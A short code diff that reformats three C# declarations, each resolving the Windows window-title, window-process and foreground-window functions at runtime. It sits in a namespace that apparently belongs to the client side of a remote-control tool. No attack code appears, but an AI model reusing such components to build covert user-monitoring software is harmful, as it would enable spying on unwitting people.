@@ -20,8 +20,13 @@ namespace BlackHole.Slave.Helper.Native.Impl
         [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Auto)]
         public delegate int dGetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
 
-        public static dGetWindowText GetWindowText = Instance.FindUmanagedFunction<dGetWindowText>("GetWindowTextW");
-        public static dGetWindowThreadProcessId GetWindowThreadProcessId = Instance.FindUmanagedFunction<dGetWindowThreadProcessId>("GetWindowThreadProcessId");
-        public static dGetForegroundWindow GetForegroundWindow = Instance.FindUmanagedFunction<dGetForegroundWindow>("GetForegroundWindow");
+        public static dGetWindowText GetWindowText = 
+            Instance.FindUmanagedFunction<dGetWindowText>("GetWindowTextW");
+
+        public static dGetWindowThreadProcessId GetWindowThreadProcessId = 
+            Instance.FindUmanagedFunction<dGetWindowThreadProcessId>("GetWindowThreadProcessId");
+
+        public static dGetForegroundWindow GetForegroundWindow = 
+            Instance.FindUmanagedFunction<dGetForegroundWindow>("GetForegroundWindow");
     }
 }
